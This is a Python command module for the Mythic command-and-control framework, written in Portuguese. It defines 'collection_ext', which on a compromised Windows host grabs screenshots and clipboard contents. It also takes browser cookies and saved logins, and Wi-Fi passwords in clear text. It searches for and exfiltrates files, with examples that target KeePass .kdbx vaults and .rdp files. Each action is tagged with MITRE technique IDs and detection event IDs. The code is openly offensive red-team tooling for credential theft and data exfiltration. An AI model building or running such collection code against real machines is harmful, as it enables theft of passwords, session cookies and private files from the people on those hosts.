from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json, base64


class CollectionExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "screenshot | clipboard | browser | wifi | search | get | multiget. "
                    "Padrão: screenshot."
                ),
                default_value="screenshot",
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/get/multiget) caminho base ou arquivo exato.",
                default_value="",
            ),
            CommandParameter(
                name="exts",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/multiget) extensões separadas por vírgula.",
                default_value=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
            ),
            CommandParameter(
                name="keywords",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/multiget) palavras-chave no nome (vírgula).",
                default_value="",
            ),
            CommandParameter(
                name="browser",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(browser) chrome | edge | firefox.",
                default_value="chrome",
            ),
            CommandParameter(
                name="all_drives",
                type=ParameterType.Boolean,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search) varrer todos os discos locais.",
                default_value=False,
            ),
            CommandParameter(
                name="max_files",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Limite de arquivos. Padrão: 200.",
                default_value=200,
            ),
            CommandParameter(
                name="max_mb",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(multiget) limite total em MB. Padrão: 50.",
                default_value=50,
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith("{"):
                d = json.loads(self.command_line)
                self.add_arg("action", d.get("action", "screenshot"))
                self.add_arg("path", d.get("path", ""))
                self.add_arg(
                    "exts",
                    d.get("exts", ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt"),
                )
                self.add_arg("keywords", d.get("keywords", ""))
                self.add_arg("browser", d.get("browser", "chrome"))
                self.add_arg(
                    "all_drives", d.get("all_drives", False), ParameterType.Boolean
                )
                self.add_arg(
                    "max_files", d.get("max_files", 200), ParameterType.Number
                )
                self.add_arg("max_mb", d.get("max_mb", 50), ParameterType.Number)
            else:
                parts = self.command_line.strip().split()
                self.add_arg(
                    "action", parts[0] if len(parts) > 0 else "screenshot"
                )
                self.add_arg("path", parts[1] if len(parts) > 1 else "")
                self.add_arg(
                    "exts", ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt"
                )
                self.add_arg("keywords", "")
                self.add_arg("browser", "chrome")
                self.add_arg("all_drives", False, ParameterType.Boolean)
                self.add_arg("max_files", 200, ParameterType.Number)
                self.add_arg("max_mb", 50, ParameterType.Number)
        else:
            self.add_arg("action", "screenshot")
            self.add_arg("path", "")
            self.add_arg("exts", ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt")
            self.add_arg("keywords", "")
            self.add_arg("browser", "chrome")
            self.add_arg("all_drives", False, ParameterType.Boolean)
            self.add_arg("max_files", 200, ParameterType.Number)
            self.add_arg("max_mb", 50, ParameterType.Number)


class CollectionExtCommand(CommandBase):
    cmd = "collection_ext"
    needs_admin = False
    help_cmd = (
        "collection_ext [action] [path]\n"
        'collection_ext {"action":"<acao>", ...}'
    )
    description = (
        "Collection (MITRE TA0009) no host do agente — conteúdo exfiltrado "
        "DIRETO para o Mythic (nada persiste no alvo).\n\n"
        "Ações:\n"
        "  screenshot : captura a tela virtual (T1113) -> PNG no Mythic\n"
        "  clipboard  : texto/imagem do clipboard (T1115) -> output/PNG\n"
        "  browser    : History/Bookmarks/Cookies/Login Data chrome/edge/firefox\n"
        "  wifi       : SSIDs e senhas Wi-Fi em claro\n"
        "  search     : lista arquivos por extensão/palavra-chave\n"
        "  get        : exfiltra 1 arquivo exato\n"
        "  multiget   : exfiltra vários arquivos com limites MB/qtd\n\n"
        "Exemplos:\n"
        '  collection_ext {"action":"screenshot"}\n'
        '  collection_ext {"action":"clipboard"}\n'
        '  collection_ext {"action":"browser","browser":"firefox"}\n'
        '  collection_ext {"action":"wifi"}\n'
        '  collection_ext {"action":"search","path":"C:\\\\Users\\\\","keywords":"senha,kdbx"}\n'
        '  collection_ext {"action":"get","path":"C:\\\\Users\\\\a\\\\backup.kdbx"}\n'
        '  collection_ext {"action":"multiget","exts":".kdbx,.rdp","max_mb":20}\n\n'
        "Detecção: EID 4688 (powershell), PS 4104, netsh wlan key=clear, "
        "Sysmon 11 (PNG breve em %TEMP%)"
    )
    version = 2
    author = "@wtechsec"
    attackmapping = ["T1005", "T1113", "T1115", "T1555.003"]
    supported_ui_features = []
    argument_class = CollectionExtArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        action = taskData.args.get_arg("action") or "screenshot"
        path = taskData.args.get_arg("path") or ""
        extra = ""
        if action == "browser":
            extra = " {}".format(taskData.args.get_arg("browser") or "chrome")
        elif action in ("search", "get", "multiget"):
            where = path or (
                "<todos os discos>"
                if taskData.args.get_arg("all_drives")
                else "<perfil do usuário>"
            )
            kw = taskData.args.get_arg("keywords") or ""
            extra = " {}{}".format(where, " kw:{}".format(kw) if kw else "")
        response.DisplayParams = "{}{}".format(action, extra)
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID, Success=True
        )

        raw = ""
        if response is not None:
            raw = (
                response.decode()
                if isinstance(response, (bytes, bytearray))
                else str(response)
            )

        output, err, files = "", "", []
        try:
            d = json.loads(raw)
            output = d.get("output", "") or ""
            err = d.get("err", "") or ""
            files = d.get("files", []) or []
        except (json.JSONDecodeError, ValueError, TypeError):
            output = raw

        text = "\n".join(x for x in (output, err) if x)
        if text:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=text.encode(),
                )
            )

        if files:
            for f in files:
                name = f.get("name", "unknown")
                try:
                    contents = base64.b64decode(f.get("b64", "") or "")
                    if not contents:
                        raise ValueError("b64 vazio")
                    fr = await SendMythicRPCFileCreate(
                        MythicRPCFileCreateMessage(
                            TaskID=task.Task.ID,
                            Filename=name,
                            FileContents=contents,
                            DeleteAfterFetch=False,
                        )
                    )
                    if fr.Success:
                        await SendMythicRPCResponseCreate(
                            MythicRPCResponseCreateMessage(
                                TaskID=task.Task.ID,
                                Response=(
                                    "[+] Exfiltrado: {} ({} bytes) — disponível na task\n"
                                    .format(name, len(contents))
                                ).encode(),
                            )
                        )
                    else:
                        await SendMythicRPCResponseCreate(
                            MythicRPCResponseCreateMessage(
                                TaskID=task.Task.ID,
                                Response=(
                                    "[!] Falha ao registrar {}: {}\n"
                                    .format(name, getattr(fr, "Error", "?"))
                                ).encode(),
                            )
                        )
                except Exception as e:
                    await SendMythicRPCResponseCreate(
                        MythicRPCResponseCreateMessage(
                            TaskID=task.Task.ID,
                            Response=(
                                "[!] Erro exfiltrando {}: {}\n"
                                .format(name, str(e))
                            ).encode(),
                        )
                    )
        return resp
